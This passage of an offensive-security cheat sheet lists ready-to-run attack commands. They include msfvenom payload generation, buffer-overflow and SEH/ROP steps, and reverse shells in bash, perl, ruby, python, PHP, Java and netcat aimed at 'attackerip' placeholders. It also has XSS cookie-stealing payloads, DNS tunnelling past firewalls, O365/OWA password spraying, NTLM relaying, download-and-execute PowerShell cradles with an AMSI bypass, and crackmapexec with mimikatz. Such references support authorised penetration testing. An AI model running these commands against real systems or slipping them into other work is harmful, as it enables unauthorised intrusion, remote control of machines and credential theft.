</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>  cd exploit-database
</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>  ./searchsploit -u
</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>  ./searchsploit apache 2.2
</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>  ./searchsploit &quot;Linux Kernel&quot;
</span></code></pre></div></p>
</li>
<li>
<p><strong>Exploit-DB CSV Filtering:</strong></p>
</li>
<li>
<p>Description: Filter and search for specific exploits within the Exploit-DB CSV file.
 <div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>  cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &quot;&lt;|&lt;=&quot; | sort -k3
</span></code></pre></div></p>
</li>
<li>
<p><strong>MSF Payload Generation:</strong></p>
</li>
<li>
<p>Description: Generate various Metasploit payloads for different platforms and scenarios.
 <div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>  msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; -f exe &gt; system.exe
</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>  msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -f raw &gt; exploit.php
</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>  msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -f asp &gt; file.asp
</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a>  msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -b &quot;\x00&quot; -f c
</span></code></pre></div></p>
</li>
<li>
<p><strong>MSF Payloads for Linux and Shellcode:</strong></p>
</li>
<li>
<p>Description: Generate payloads and shellcode for Linux and Windows.
 <div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -f elf -a x86 &gt; shell
</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>  msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 -f c
</span></code></pre></div></p>
</li>
<li>
<p><strong>Other Payload Types:</strong></p>
</li>
<li>Description: Generate payloads for Python, ASP, Bash, and more.
 <div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>  msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>  msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f asp -a x86 &gt; shell.asp
</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>  msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -o shell.sh
</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a>  msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -o shell.php
</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a>  # Add &#39;&lt;?php&#39; at the beginning and run: perl -i~ -0777pe&#39;s/^/&lt;?php \n/&#39; shell.php
</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a>  msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f exe -a x86 &gt; shell.exe
</span></code></pre></div></li>
</ol>
<h1 id="_2"></h1>
<h1 id="linux-commonly-used-security-commands">Linux commonly used security commands</h1>
<div class="language-text highlight"><pre><span></span><code>find / -uid 0 -perm -4000

find / -perm -o=w

find / -name ” ” -print
find / -name “..” -print
find / -name “. ” -print
find / -name ” ” -print

find / -nouser

lsof +L1

lsof -i

arp -a

getent passwd

getent group

for user in $(getent passwd|cut -f1 -d:); do echo “### Crontabs for $user ####”; crontab -u $user -l; done

cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&amp;*()_+{}|:&lt;&gt;?=’|fold -w 12| head -n 4

find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’
chattr -i file
</code></pre></div>
<h1 id="windows-buffer-overflow-exploits">Windows Buffer Overflow exploits</h1>
<div class="language-text highlight"><pre><span></span><code>msfvenom -p windows/shell_bind_tcp -a x86 –platform win -b “\x00” -f c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 –platform win -e x86/shikata_ga_nai -b “\x00” -f c
</code></pre></div>
<h1 id="commonly-used-bad-characters">COMMONLY USED BAD CHARACTERS:</h1>
<div class="language-text highlight"><pre><span></span><code>\x00\x0a\x0d\x20 For http request
\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c Ending with (0\n\r_)
</code></pre></div>
<h1 id="regular-command">Regular command:</h1>
<div class="language-text highlight"><pre><span></span><code>pattern create
pattern offset (EIP Address)
pattern offset (ESP Address)
add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )

!pvefindaddr pattern_create 5000
!pvefindaddr suggest
!pvefindaddr nosafeseh


!mona config -set workingfolder C:\Mona\%p

!mona config -get workingfolder
!mona mod
!mona bytearray -b “\x00\x0a”
!mona pc 5000
!mona po EIP
!mona suggest
</code></pre></div>
<h1 id="seh-structured-exception-handling">SEH – Structured exception handling</h1>
<p>Note: SEH (“Structured Exception Handling”), or structured exception handling, is a powerful processor error or exception weapon provided by the Windows operating system to the programmer.</p>
<div class="language-text highlight"><pre><span></span><code># https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
# http://baike.baidu.com/view/243131.htm
!mona suggest
!mona nosafeseh
nseh=”\xeb\x06\x90\x90″ (next seh chain)
iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
</code></pre></div>
<h1 id="rop-dep">ROP (DEP)</h1>
<p>Note: ROP (“Return-Oriented Programming”) is a computer security exploit technology that allows an attacker to execute code, such as un-executable memory and code signatures, in a security defense situation.</p>
<p>DEP (“Data Execution Prevention”) is a set of hardware and software technology, in memory, strictly to distinguish between code and data to prevent the data as code execution.</p>
<div class="language-text highlight"><pre><span></span><code># https://en.wikipedia.org/wiki/Return-oriented_programming
# https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B
# https://en.wikipedia.org/wiki/Data_Execution_Prevention
# http://baike.baidu.com/item/DEP/7694630
!mona modules
!mona ropfunc -m *.dll -cpb “\x00\x09\x0a”
!mona rop -m *.dll -cpb “\x00\x09\x0a” (auto suggest)
</code></pre></div>
<h1 id="aslr-address-space-format-randomization">ASLR – Address space format randomization</h1>
<div class="language-text highlight"><pre><span></span><code># https://en.wikipedia.org/wiki/Address_space_layout_randomization
!mona noaslr
</code></pre></div>
<h1 id="egg-hunter-technology">EGG Hunter technology</h1>
<p>Egg hunting This technique can be categorized as a “graded shellcode”, which basically supports you to find your actual (larger) shellcode (our “egg”) with a small, specially crafted shellcode, In search of our final shellcode. In other words, a short code executes first, then goes to the real shellcode and executes it. – Making reference to see Ice Forum , more details can be found in the code I add comments link.</p>
<div class="language-text highlight"><pre><span></span><code># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
# http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf
# http://www.fuzzysecurity.com/tutorials/expDev/4.html
!mona jmp -r esp
!mona egg -t lxxl
\xeb\xc4 (jump backward -60)
buff=lxxllxxl+shell
!mona egg -t ‘w00t’
</code></pre></div>
<h1 id="gdb-debugger-commonly-used-commands">GDB Debugger commonly used commands</h1>
<div class="language-text highlight"><pre><span></span><code>break *_start
next
step
n
s
continue
c
</code></pre></div>
<h1 id="data">Data</h1>
<div class="language-text highlight"><pre><span></span><code>checking ‘REGISTERS’ and ‘MEMORY’
</code></pre></div>
<h1 id="display-the-register-values-decimalbinaryhex">Display the register values: (Decimal,Binary,Hex)</h1>
<div class="language-text highlight"><pre><span></span><code>print /d –&gt; Decimal
print /t –&gt; Binary
print /x –&gt; Hex
O/P :
(gdb) print /d $eax
$17 = 13
(gdb) print /t $eax
$18 = 1101
(gdb) print /x $eax
$19 = 0xd
(gdb)
</code></pre></div>
<h1 id="display-the-value-of-a-specific-memory-address">Display the value of a specific memory address</h1>
<div class="language-text highlight"><pre><span></span><code>command : x/nyz (Examine)
n –&gt; Number of fields to display ==&gt;
y –&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)
z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)
</code></pre></div>
<h1 id="bash-rebound-shell">BASH rebound Shell</h1>
<div class="language-text highlight"><pre><span></span><code>bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1

exec /bin/bash 0&amp;0 2&gt;&amp;0
exec /bin/bash 0&amp;0 2&gt;&amp;0

0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196

0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196

exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done
exec 5&lt;&gt;/dev/tcp/attackerip/4444

cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:
while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done

/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1
/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1
</code></pre></div>
<h1 id="perl-rebound-shell">PERL rebound Shell</h1>
<div class="language-text highlight"><pre><span></span><code>perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:443″);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’
</code></pre></div>
<h1 id="win-platform">Win platform</h1>
<div class="language-text highlight"><pre><span></span><code>perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’
perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’
</code></pre></div>
<h1 id="ruby-rebound-shell">RUBY rebound Shell</h1>
<div class="language-text highlight"><pre><span></span><code>ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
</code></pre></div>
<h1 id="win-platform_1">Win platform</h1>
<div class="language-text highlight"><pre><span></span><code>ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
ruby -rsocket -e ‘f=TCPSocket.open(“attackerip”,”443″).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’
</code></pre></div>
<h1 id="python-rebound-shell">PYTHON rebound Shell</h1>
<div class="language-text highlight"><pre><span></span><code>python -c ‘import                                                 socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“attackerip”,443));os.dup2(s.fileno(),0);                 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
</code></pre></div>
<h1 id="php-bounce-shell">PHP bounce Shell</h1>
<div class="language-text highlight"><pre><span></span><code>php -r ‘$sock=fsockopen(“attackerip”,443);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’
</code></pre></div>
<h1 id="java-rebound-shell">JAVA rebound Shell</h1>
<div class="language-text highlight"><pre><span></span><code>r = Runtime.getRuntime()
p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done”] as String[])
p.waitFor()
</code></pre></div>
<h1 id="netcat-rebound-shell">NETCAT rebound Shell</h1>
<div class="language-text highlight"><pre><span></span><code>nc -e /bin/sh attackerip 4444
nc -e /bin/sh 192.168.37.10 443
</code></pre></div>
<h1 id="if-the-e-parameter-is-disabled-you-can-try-the-following-command">If the -e parameter is disabled, you can try the following command</h1>
<div class="language-text highlight"><pre><span></span><code># mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe
/bin/sh | nc attackerip 443
rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/
</code></pre></div>
<h1 id="if-you-installed-the-wrong-version-of-netcat-try-the-following-command">If you installed the wrong version of netcat, try the following command</h1>
<div class="language-text highlight"><pre><span></span><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f

TELNET rebound Shell
</code></pre></div>
<h1 id="if-netcat-is-not-available">If netcat is not available</h1>
<div class="language-text highlight"><pre><span></span><code>mknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe

XTERM rebound Shell
</code></pre></div>
<h1 id="enable-the-x-server-1-listen-on-tcp-port-6001">Enable the X server (: 1 – listen on TCP port 6001)</h1>
<div class="language-text highlight"><pre><span></span><code>apt-get install xnest
Xnest :1
</code></pre></div>
<h1 id="remember-to-authorize-the-connection-from-the-target-ip">Remember to authorize the connection from the target IP</h1>
<div class="language-text highlight"><pre><span></span><code>xterm -display 127.0.0.1:1
</code></pre></div>
<h1 id="grant-access">Grant access</h1>
<div class="language-text highlight"><pre><span></span><code>xhost +targetip
</code></pre></div>
<h1 id="connect-back-to-our-x-server-on-the-target-machine">Connect back to our X server on the target machine</h1>
<div class="language-text highlight"><pre><span></span><code>xterm -display attackerip:1
/usr/openwin/bin/xterm -display attackerip:1
or
$ DISPLAY=attackerip:0 xterm
</code></pre></div>
<h1 id="xss">XSS</h1>
<div class="language-text highlight"><pre><span></span><code># https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
(“&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;”)

&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;

‘;alert(String.fromCharCode(88,83,83))//\’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//\”;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;

“;!–”&lt;XSS&gt;=&amp;amp;amp;{()}

&lt;IMG SRC=”javascript:alert(‘XSS’);”&gt;
&lt;IMG SRC=javascript:alert(‘XSS’)&gt;
&lt;IMG “””&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;””&gt;
&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;

&lt;IMG                     SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;
&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;

perl -e ‘print “&lt;IMG SRC=javascript:alert(\”XSS\”)&gt;”;’ &gt; out

&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt;

(“&gt;&lt; iframes http://google.com &lt; iframes &gt;)

&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/FRAMESET&gt;
“&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;
%253cscript%253ealert(document.cookie)%253c/script%253e
“&gt;&lt;s”%2b”cript&gt;alert(document.cookie)&lt;/script&gt;
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
&lt;img src=asdf onerror=alert(document.cookie)&gt;

SSH Over SCTP (using Socat)

$ socat SCTP-LISTEN:80,fork TCP:localhost:22
$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80
$ ssh -lusername localhost -D 8080 -p 1337
</code></pre></div>
<h1 id="metagoofil-metadata-collection-tool">Metagoofil – Metadata collection tool</h1>
<div class="language-text highlight"><pre><span></span><code>Note: Metagoofil is a tool for collecting information using Google.
$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html
</code></pre></div>
<h1 id="use-a-dns-tunnel-to-bypass-the-firewall">Use a DNS tunnel to bypass the firewall</h1>
<div class="language-text highlight"><pre><span></span><code>$ apt-get update
$ apt-get -y install ruby-dev git make g++
$ gem install bundler
$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/server
$ bundle install
$ ruby ./dnscat2.rb
dnscat2&gt; New session established: 16059
dnscat2&gt; session -i 16059
</code></pre></div>
<h1 id="red-team-and-infrastructure-assessments">Red-Team and Infrastructure Assessments</h1>
<h3 id="external-recon">External recon</h3>
<p>https://github.com/dcsync/recontools</p>
<h3 id="o365-bruting">O365 bruting</h3>
<p><code>python3 office365userenum.py -u test.txt -v -o output.txt --password 'Password1</code></p>
<p>Enumeration (opsec safe):</p>
<p><code>python o365creeper.py -f test.txt</code></p>
<p>https://github.com/0xZDH/o365spray</p>
<h3 id="subdomain-finder">subdomain finder</h3>
<p>https://spyse.com/</p>
<h3 id="cert-search">Cert search</h3>
<p>https://crt.sh
<code>%.blah.com</code></p>
<h3 id="search-categorized-expired-domain">search categorized expired domain</h3>
<p><code>python3 ./domainhunter.py -r 1000</code></p>
<h3 id="metadata">Metadata</h3>
<p><code>PS C:\&gt; Invoke-PowerMeta -TargetDomain targetdomain.com</code></p>
<h2 id="domain-user-enumeration">Domain User Enumeration</h2>
<h3 id="mailsniper">MailSniper</h3>
<h4 id="usernameharvest">Usernameharvest</h4>
<p><code>Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt</code></p>
<h4 id="domainnameharvest">Domainnameharvest</h4>
<p><code>Invoke-DomainHarvestOWA -ExchHostname mail.domain.com</code> </p>
<h4 id="owa-spray">OWA Spray</h4>
<p><code>Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt</code></p>
<h3 id="grab-employee-names-from-linkedin">Grab employee names from Linkedin</h3>
<p><code>theharvester -d blah.com -l 1000 -b linkedin</code></p>
<p>https://github.com/m8r0wn/CrossLinked</p>
<h3 id="extract-linkedin-details-from-snovio">Extract Linkedin details from snov.io</h3>
<p>Regex to extract emails</p>
<p><code>grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"</code></p>
<h3 id="extract-from-burp">Extract from burp</h3>
<p><code>cat linkedin.txt | tr , '\n' | sed 's/\”//g' | awk '/"title":{"textDirection":"FIRST_STRONG"/{getline; print}'</code></p>
<h3 id="change-format-to-blah">Change format to b.lah</h3>
<p><code>awk '=FS tolower(substr(,1,1)$NF)' linkedin-user-list.txt | awk '{ print   }'</code></p>
<p><code>awk '{print $0,tolower(substr($1,1,1)$NF)}' names.txt</code></p>
<h3 id="check-usernames-against-ad">Check usernames against AD:</h3>
<p>Handy if you have generated a list from linkedin or a list of usernames.</p>
<p><code>nmap -p 88 1.1.1.1 --script krb5-enum-users --script-args krb5-enum-users.realm="DOMAIN"</code></p>
<p>username list is located at <code>/usr/local/share/nmap/nselib/data/usernames.lst</code> in Kali</p>
<h3 id="null-sessions">Null sessions</h3>
<p>Still works on infra that was upgraded from 2k, 2k3.</p>
<p><code>net use \\IP_ADDRESS\ipc$ "" /user:""</code></p>
<p>Use enum4linux, enum or Dumpsec following the null session setup.</p>
<h3 id="gpp">GPP</h3>
<p>https://bitbucket.org/grimhacker/gpppfinder/src/master/</p>
<p><code>findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</code></p>
<h2 id="situational-awareness">situational awareness</h2>
<p>https://github.com/dafthack/HostRecon</p>
<p>Privesc checks:
https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation</p>
<h2 id="network-attacks">Network Attacks</h2>
<h3 id="responder">Responder</h3>
<p>Grab NetNTLM hashes off the network</p>
<h4 id="without-wpad">Without wpad:</h4>
<p><code>responder -I eth0</code></p>
<h4 id="with-wpad">With wpad:</h4>
<p><code>responder -I eth0 --wpad -b -f -F</code></p>
<h4 id="filter-logs-from-logs-folder-and-remove-machine-accounts">Filter logs from logs folder and remove machine accounts:</h4>
<p><code>sort -m *.txt | uniq -d | awk '!/\$/'</code></p>
<h4 id="cracking-with-john">Cracking with John:</h4>
<p><code>john SMB-NTLMv2-Client-172.20.22.217.txt --wordlist=/root/passwords.txt</code></p>
<p>Use hashcat on a more powerful box. This is only for easy wins.</p>
<h4 id="ntlm-relaying">NTLM Relaying</h4>
<p><code>ntlmrelayx.py -tf targets.txt -c &lt;insert Empire Powershell launcher&gt;</code></p>
<h3 id="mitm6">MITM6</h3>
<p><code>python mitm6.py -d blah.local</code></p>
<h4 id="capture-hashes">Capture hashes</h4>
<p><code>impacket-smbserver hiya /tmp/ -smb2support</code></p>
<h2 id="bruteforce-domain-passwords">Bruteforce domain passwords</h2>
<h3 id="common-passwords">Common Passwords</h3>
<p>$Company1
$Season$Year
Password1
Password!
Welcome1
Welcome!
Welcome@123
P@55word
P@55w0rd
$month$year</p>
<h3 id="using-hydra">Using hydra</h3>
<p><code>hydra -L users.txt -p Password1 -m 'D' 172.20.11.55 smbnt -V</code></p>
<h3 id="bruteforce-using-net-use">Bruteforce using net use</h3>
<p><code>@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\DOMAINCONTROLLER\IPC$ /user:DOMAIN\%n %p 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %n:%p &amp;&amp; @net use /delete \\DOMAINCONTROLLER\IPC$ &gt; NUL</code></p>
<h3 id="all-systems">all systems</h3>
<p><code>net view /domain &gt; systems.txt</code></p>
<h3 id="local-admin-search-using-net-use">Local admin search using net use</h3>
<p><code>@FOR /F %s in (systems.txt) DO @net use \\%s\C$ /user:domain\username  
Password 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo %s&gt;&gt;admin_access.txt &amp;&amp; @net use 
/delete \\%s\C$ &gt; NUL</code></p>
<h3 id="domain-joined-machine">Domain joined machine</h3>
<p><code>Invoke-DomainPasswordSpray -Password Spring2017</code></p>
<h2 id="non-domain-joined-testing">Non-domain joined testing</h2>
<p>When you have an initial set of compromised creds run these from a Virtual Machine to place foothold on network as domain user.</p>
<h3 id="shell-with-domain-user-privileges">Shell with domain user privileges</h3>
<p><code>C:\runas.exe /netonly /user:BLAHDOMAIN\blahuser cmd.exe</code></p>
<p><code>runas /netonly /user:blah@blah.com "mmc %SystemRoot%\system32\dsa.msc</code></p>
<p>Make sure you use the FQDN of the domain and set the reg key as below.</p>
<h3 id="check-dc">check dc:</h3>
<p><code>nltest /dsgetdc:domain.local</code></p>
<p>To change DC via registry to point at domain being tested:</p>
<p>HKEY_LOCAL_MACHINE
SYSTEM
CurrentControlSet
Services
Netlogon
Parameters
“SiteName“ &gt; DC1.domain.com</p>
<h3 id="create-session-for-use-with-dumpsec">Create session for use with dumpsec</h3>
<p><code>net use \\10.0.0.1\ipc$ /user:domain.local\username password</code></p>
<h3 id="quick-user-lists-and-password-policy-enum">Quick User lists and password policy enum</h3>
<p><code>net users /domain</code></p>
<p><code>net group /domain "Domain Admins"</code></p>
<p><code>net accounts /domain</code></p>
<p>Note that the above commands do not work with runas. Below PowerView functions will work with runas.</p>
<h3 id="powerview">Powerview:</h3>
<p><code>. .\PowerView.ps1</code></p>
<p><code>Get-UserProperty -Properties samaccountname</code></p>
<p><code>Get-NetGroupMember</code></p>
<p><code>Get-DomainPolicy</code></p>
<p>Search shares and files using Invoke-FileFinder and Invoke-ShareFinder</p>
<h2 id="domain-analysis">Domain Analysis</h2>
<h3 id="bloodhound">BloodHound</h3>
<p>Run locally on non-domain joined machine (remember to add target domain to registry):</p>
<p><code>..\BloodHound.ps1</code></p>
<p><code>Invoke-BloodHound</code></p>
<h3 id="sharphound">SharpHound</h3>
<p><code>SharpHound.exe --CollectionMethod All</code></p>
<h3 id="run-from-remote-shell">Run from remote shell</h3>
<p>Useful when you have a remote shell.</p>
<p><code>powershell Set-ExecutionPolicy RemoteSigned</code></p>
<p><code>powershell -command "&amp; { . C:\BloodHound.ps1; Invoke-BloodHound }"</code></p>
<h3 id="run-from-web-server-or-over-internet">Run from web server or over Internet:</h3>
<p>Use this when you cannot copy BloodHound.ps1 over to target.</p>
<p><code>powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1'); Invoke-BloodHound"</code></p>
<h3 id="run-using-sharppick-amsi-bypass">Run using Sharppick - AMSI bypass</h3>
<p>SharpPick.exe -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound"</p>
<p><code>SharpPick-64.exe -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"</code></p>
<h3 id="goddi-fast-dump-all-domain-info">Goddi (fast dump all domain info)</h3>
<p><code>.\godditest-windows-amd64.exe -username=testuser -password="testpass!" -domain="test.local" -dc="dc.test.local" -unsafe</code></p>
<h3 id="adrecon-more-detailed-good-for-ad-auditing">ADRecon (More detailed - Good for AD Auditing)</h3>
<p>https://github.com/sense-of-security/ADRecon</p>
<h3 id="share-and-file-finder">Share and file finder</h3>
<p><code>Invoke-ShareFinder -CheckShareAccess -Verbose -Threads 20 | 
Out-File -Encoding Ascii interesting-shares.txt</code></p>
<p><code>Invoke-FileFinder -ShareList .\interesting-shares.txt -Verbose -Threads 
20 -OutFile juicy_files.csv</code></p>
<h3 id="eyewitness">Eyewitness</h3>
<p>docker run --rm -it -v /tmp/blah:/tmp/EyeWitness eyewitness --web --single https://www.google.com</p>
<h3 id="windows-priv-esc">Windows priv esc</h3>
<p>https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</p>
<h2 id="compromise-and-lateral-movement">Compromise and Lateral Movement</h2>
<h3 id="crackmapexec">Crackmapexec</h3>
<p><code>crackmapexec smb 172.16.110.0/24</code></p>
<p><code>crackmapexec smb 172.16.110.154 -u Administrator -p Password1 -x 'ipconfig'</code></p>
<p><code>crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --pass-pol</code></p>
<p><code>crackmapexec smb 172.16.110.154 -u Administrator -p Password1 -M mimikatz</code></p>
<p><code>crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --sam</code></p>
